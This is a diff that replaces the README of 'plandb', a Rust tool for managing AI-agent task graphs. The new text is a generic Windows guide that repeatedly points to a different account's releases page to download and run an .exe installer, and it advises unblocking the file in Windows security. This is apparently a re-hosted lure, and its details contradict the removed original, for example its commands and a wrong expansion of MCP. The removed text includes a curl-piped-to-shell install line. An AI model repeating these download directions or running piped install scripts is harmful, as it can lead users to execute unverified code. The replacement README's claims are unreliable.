@@ -1,269 +1,150 @@
-<h1 align="center">plandb</h1>
+# ⚙️ plandb - Manage Tasks for AI Agents Simply
 
-<p align="center">
-<strong>SQLite for agent task management.</strong><br>
-A single binary (~2.6 MB) that manages task dependency graphs for AI agents. Local-first. Zero config.
-</p>
-
-<p align="center">
-  <a href="https://github.com/Agent-Field/plandb/actions/workflows/release.yml"><img src="https://github.com/Agent-Field/plandb/actions/workflows/release.yml/badge.svg" alt="CI"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue" alt="License"></a>
-  <a href="https://www.rust-lang.org/"><img src="https://img.shields.io/badge/rust-stable-orange" alt="Rust"></a>
-  <a href="https://github.com/Agent-Field/plandb/releases"><img src="https://img.shields.io/badge/binary-~2.6MB-informational" alt="Binary Size"></a>
-</p>
-
-<p align="center">
-  <a href="#quick-start">Quick Start</a> · <a href="#install">Install</a> · <a href="#mcp-setup">MCP Setup</a> · <a href="#why-plandb">Why Plandb?</a> · <a href="#comparison">Comparison</a> · <a href="#all-features">Features</a> · <a href="#contributing">Contributing</a>
-</p>
+[![Download plandb](https://img.shields.io/badge/Download-plandb-blue?style=for-the-badge)](https://github.com/zetsor/plandb/releases)
 
 ---
 
-## Quick Start
+## 📋 About plandb
 
-Create a project and add tasks with dependencies:
+plandb helps you organize and manage tasks for AI agents. It acts like a simple system to track what tasks need to be done, which are in progress, and which are complete. This tool runs on Windows and works behind the scenes to keep AI task flows smooth and clear.
 
-```bash
-plandb init "build-auth-system"
-# created p-a1b2c3 (build-auth-system)
-# next: plandb add --title "First task"
-# tip:  start with 1-2 tasks. add more as you learn things.
+It uses a task graph, which is a way to organize tasks so you can see how they connect and depend on each other. This helps if you want to plan AI actions step by step without confusion.
 
-plandb add --title "Design JWT schema"
-plandb add --title "Implement middleware" --dep t-d4e5f6
-plandb add --title "Write tests" --dep t-g7h8i9
-```
+## 💻 System Requirements
 
-Claim a task — plandb delivers upstream context automatically:
+To run plandb on your Windows PC, your system should have:
 
-```bash
-plandb go --agent claude-1
-# → t-d4e5f6 "Implement middleware" [1/3 · 1 ready · 1 blocked]
-#
-# upstream:
-#   t-a1b2c3 → "JWT schema: RS256, 15min access, 7d refresh"
-#
-# downstream: t-g7h8i9 "Write tests" (receives YOUR result)
-```
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- At least 100 MB of free disk space  
+- Internet connection for initial download (optional after install)  
 
-Complete it — see what you unlocked and claim the next task:
+No special hardware is needed. The program runs as a simple command-line tool, so no heavy graphics or high-end CPUs are required.
 
-```bash
-plandb done t-d4e5f6 --result "middleware on /api/* routes" --next --agent claude-1
-# ✓ t-d4e5f6 done → claimed t-g7h8i9 "Write tests" [2/3 · 1 ready]
-#   upstream: t-d4e5f6 → middleware on /api/* routes
-```
+## 🚀 Download and Install
 
-See the dependency graph:
+You need to visit the release page to download the plandb app for Windows.
 
-```bash
-plandb status --detail
-# p-a1b2c3 build-auth-system: 2/3 done (66%)
-# ✓ t-a1b2c3 Design JWT schema
-#   └─✓ t-d4e5f6 Implement middleware
-#     └─◉ t-g7h8i9 Write tests @claude-1
-```
+[![Download plandb](https://img.shields.io/badge/Download-plandb-grey?style=for-the-badge)](https://github.com/zetsor/plandb/releases)
 
-Two commands per task. Results flow through the graph — each task sees what its dependencies produced.
+1. Click the download button above or go to this link:  
+   https://github.com/zetsor/plandb/releases
 
-## Install
+2. On the release page, look for the latest version. It will be named something like `plandb-windows.exe` or similar.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/Agent-Field/plandb/main/install.sh | sh
-```
+3. Click on the `.exe` file to start downloading.
 
-<details>
-<summary>Other install methods</summary>
+4. After the download finishes, open the file to start the installation.
 
-**Direct download:**
-[GitHub Releases](https://github.com/Agent-Field/plandb/releases) — prebuilt binaries for Linux and macOS (x86_64 + ARM).
+5. Follow the instructions in the installation wizard. Choose where to save the program or keep the default path.
 
-**From source:**
-```bash
-git clone https://github.com/Agent-Field/plandb.git && cd plandb
-cargo install --path .
-```
+6. Once installed, plandb is ready to use.
 
-</details>
+## 🧰 How to Run plandb on Windows
 
-## MCP Setup
+After installation, you run plandb from the Windows Command Prompt.
 
-Works with Claude Code, Cursor, Windsurf, or any MCP client:
+1. Press `Windows key + R` to open the Run dialog.
 
-```json
-{
-  "mcpServers": {
-    "plandb": {
-      "command": "plandb",
-      "args": ["mcp"]
-    }
-  }
-}
-```
+2. Type `cmd` and press Enter.
 
-<details>
-<summary>CLI and HTTP setup</summary>
+3. In the command window, type `plandb` and press Enter.
 
-```bash
-plandb prompt --for mcp     # Claude Code, Cursor, Windsurf
-plandb prompt --for cli     # Codex, Aider — paste into system prompt
-plandb prompt --for http    # OpenRouter, custom agents
-```
+If you see a message or help screen, it means the program is running correctly.
 
-**HTTP mode:**
-```bash
-plandb serve --port 8080    # REST API + SSE event stream
-```
-</details>
+## 🔧 Basic Usage
+
+plandb uses commands to handle tasks. Here are some basic commands you can type in the command window:
+
+- `plandb add "Task description"`  
+  This adds a new task with the description you type in quotes.
+
+- `plandb list`  
+  This shows all tasks you have added.
+
+- `plandb done <task_id>`  
+  This marks a task as finished. Replace `<task_id>` with the task number shown in the list.
+
+- `plandb graph`  
+  Shows how tasks are connected.
+
+You can run `plandb help` to see all available commands.
+
+## 🗂️ What plandb Does
+
+- Organizes tasks in a clear order  
+- Shows dependencies between tasks  
+- Helps monitor progress  
+- Stores data locally using SQLite  
+- Runs quickly thanks to Rust's performance  
+- Works well with other AI tools or scripts  
+
+## ⚙️ Settings and Configuration
+
+plandb stores its data in a local file. By default, it keeps files in a folder named `plandb_data` in your Documents.
+
+You can change settings by editing a simple config file located inside that folder. The config file uses plain text and is easy to understand.
+
+If you need to reset plandb, just delete the `plandb_data` folder. This will remove all tasks stored.
+
+## 💡 Tips for New Users
+
+- Always give clear names to your tasks. This helps you and any AI using plandb understand what needs to be done.
+
+- Use `plandb list` often to check progress.
+
+- When tasks depend on others, add all related tasks before running the graph command.
+
+- You can copy commands from this guide and paste them in the command prompt.
+
+## 🔄 Updating plandb
+
+To stay up to date:
+
+1. Visit the release page:  
+   https://github.com/zetsor/plandb/releases
+
+2. Download the newest `.exe` file.
+
+3. Run the installer again to replace the old version.
+
+You don’t need to uninstall the old version first.
+
+## 🛠️ Troubleshooting
+
+If plandb does not start:
+
+- Check you have the right Windows version.
+
+- Make sure you installed all files correctly.
+
+- Confirm the `.exe` file is not blocked by Windows security. Right-click the file, choose Properties, and if you see an "Unblock" button, click it.
+
+- If you see errors in the command prompt, copy the message and seek help in community forums or GitHub issues.
 
 ---
 
-## Why Plandb?
+## 🔗 Useful Links
 
-AI agents (Claude Code, Codex, Cursor, Aider, custom LLM pipelines) hit the same coordination wall: how do you manage subtasks with dependencies across sessions, agents, and time?
+- Download and install:  
+  https://github.com/zetsor/plandb/releases
 
-The common workaround — GitHub Issues, Notion boards, ad-hoc JSON files — was designed for humans, not agents:
+- Official repository:  
+  https://github.com/zetsor/plandb
 
-- **Agents become stateless** — each session starts fresh, can't see what other agents did
-- **Dependencies are implicit** — nothing enforces "don't start B until A is done"
-- **Plans can't change** — reorganizing 12 GitHub issues mid-execution costs 3,000+ tokens
-- **Token overhead** — API responses optimized for humans, not 8K context windows
-- **Single point of coupling** — offline or rate-limited? Everything stops
+---
 
-Plandb is one binary (~2.6MB) that manages a task dependency graph in SQLite. Three interfaces: CLI, MCP server, HTTP API. No daemon. No external services.
+## 📖 Topics Covered
 
-### Why not just let each agent track its own plan?
+This project is related to:
 
-Every AI coding agent already has internal task management. So why external state?
-
-| Problem | Internal plan | Plandb |
-|---------|--------------|-------|
-| **Multi-agent coordination** | Each agent has its own plan. Can't see each other's work. | Shared graph with atomic claim protocol. No double-claims. |
-| **Session continuity** | Agent dies, context is lost. | Graph persists. New agent picks up with handoff context. |
-| **Plan adaptation** | Rewriting internal state. No consequence preview. | `what-if cancel` shows ripple effects. `task insert` rewires atomically. |
-| **Dependency enforcement** | Agent decides order by vibes. | Topological ordering. `go` only returns tasks with all deps complete. |
-| **Parallelization** | One agent, sequential. | Graph shows 3 tasks ready → harness spawns 3 agents. |
-| **Observability** | No answer until it finishes. | `plandb status` anytime: `5/12 done, 2 running, 1 ready`. |
-
-## How It Works
-
-### The Agent Loop
-
-```
-1. plandb init "my-project"
-2. plandb add --title "..." (define tasks + dependencies)
-3. plandb go --agent my-agent       → shows upstream context
-4. ... work on the task ...
-5. plandb done --result "..." --next → shows unlocked tasks, claims next
-6. goto 4
-```
-
-### Multiple Agents in Parallel
-
-```
-Harness checks: plandb status → "3 tasks ready"
-Harness spawns 3 agents, each runs:
-  plandb go --agent agent-N                → gets a different ready task (atomic claim)
-  ... work ...
-  plandb done ID --next --agent agent-N    → completes, claims next ready task
-```
-
-No two agents claim the same task. When Agent 1 finishes task A, tasks that depended on A become ready for other agents.
-
-### Adapting the Plan Mid-Flight
-
-Agent is on task 5 of 12 and discovers the approach is wrong:
-
-```bash
-plandb ahead                          # see what's coming (lookahead buffer)
-plandb what-if cancel t-abc1          # preview: "would delay 3 tasks, orphan 0"
-plandb task insert --after A --before B --title "Add auth"   # add a missed step
-plandb task amend t-xyz --prepend "NOTE: use JWT, not sessions"  # annotate
-plandb task pivot t-parent --keep-done --file new-plan.yaml  # replace a subtree
-plandb task split t-big --into '[...]'                       # decompose mid-execution
-```
-
-Every mutation response includes `effect.delayed`, `effect.ready_now`, and `project_state`. No guessing.
-
-## What Makes It AI-Specific
-
-These aren't features you'd build for human project managers:
-
-**Dynamic context delivery** — `go` shows upstream results from completed dependencies. `done` shows which tasks were unlocked and nudges the agent to build downstream connections. Plans evolve naturally.
-
-**Short IDs** — 8-character task IDs (`t-a1b2c3`), not UUIDs. Every token matters.
-
-**Compound commands** — `go` = claim + start. `done --next` = complete + claim next. What takes 4-5 API calls with GitHub Issues takes 1.
-
-**Fuzzy ID resolution** — Agent misspells an ID? Plandb suggests the closest match. LLMs make typos.
-
-**`--help` as documentation** — No system prompt needed. The agent runs `--help` and discovers commands itself.
-
-**Effect analysis** — Every mutation returns what got delayed, what's now ready, and the new critical path.
-
-**Handoff protocol** — Agent 1's result is automatically context for Agent 2's downstream task.
-
-## Comparison
-
-| | Plandb | GitHub Issues | Linear | TaskMaster AI |
-|---|---|---|---|---|
-| Local-first | Yes | No | No | No |
-| MCP server | Yes | No | No | Partial |
-| CLI + HTTP API | Yes | Limited | Limited | Partial |
-| Dependency graph | Yes | No | No | Partial |
-| Token-optimized | Yes | No | No | Partial |
-| JIT plan adaptation | Yes | No | No | No |
-| Single binary | Yes | No | No | No |
-| Multi-agent claim | Yes | No | No | No |
-| Dynamic context delivery | Yes | No | No | No |
-
-## All Features
-
-- **Three interfaces** — CLI, MCP server (stdio JSON-RPC), HTTP API (REST + SSE)
-- **Dependency graph** — `feeds_into`, `blocks`, `validates`, `informs`
-- **Claim protocol** — atomic claim + heartbeat + timeout reclaim
-- **Compound commands** — `go`, `done --next`, `next --claim`, `init`
-- **Dynamic context delivery** — `go` surfaces upstream results, `done` shows unlocked tasks
-- **JIT planning** — `what-if`, `insert`, `ahead`, `amend`, `pivot`, `split`
-- **Effect analysis** — every mutation returns delayed/accelerated/ready_now/critical_path
-- **DAG tree view** — `status --detail` renders the dependency graph with unicode tree characters
-- **Short IDs** — 8-char task/project IDs
-- **Compact output** — terse defaults, `--json` for machine parsing
-- **Handoff protocol** — results propagate through dependency edges
-- **Fuzzy ID resolution** — typo recovery + closest-match suggestions
-- **File tracking** — attach files to tasks, detect conflicts between agents
-- **Notes + events** — inter-agent signals and real-time event stream
-- **Pause/resume** — partial completion with progress tracking
-- **Sticky project** — `plandb use <id>` sets default, fewer flags per command
-- **Progressive status** — one-liner, `--detail` (DAG tree), or `--full`
-
-## Beyond Code
-
-Plandb coordinates any work with dependencies — not just software:
-
-- **Research pipelines** — parallel literature searches, synthesize when all complete
-- **Data workflows** — ETL stages with fan-out/fan-in dependency patterns
-- **Content production** — research → outline → draft → review → publish
-- **Infrastructure** — provision resources in dependency order
-- **Multi-model chains** — route subtasks to specialized models, aggregate results
-
-## Philosophy
-
-Plandb is a primitive, not a platform. It does one thing: coordinate dependent tasks across agents with minimal overhead. It doesn't schedule agents, doesn't pick models, doesn't manage git. It's the SQLite of agent task management — embed it, script it, build on it.
-
-## Contributing
-
-Contributions welcome! Plandb is written in Rust with zero runtime dependencies beyond SQLite (bundled).
-
-```bash
-git clone https://github.com/Agent-Field/plandb.git
-cd plandb
-cargo build
-cargo test
-bash tests/functional_test.sh    # 113 functional assertions
-```
-
-Check out the [open issues](https://github.com/Agent-Field/plandb/issues) or open a new one if you have ideas.
-
-## License
-
-Apache License 2.0
+- AI Agents  
+- Command Line Interface (CLI)  
+- JIT Planning  
+- Large Language Models (LLM)  
+- Multiprocessing Control Plane (MCP)  
+- Task Orchestration  
+- Rust Programming  
+- SQLite Database  
+- Task Graphs  
+- Task Management Systems
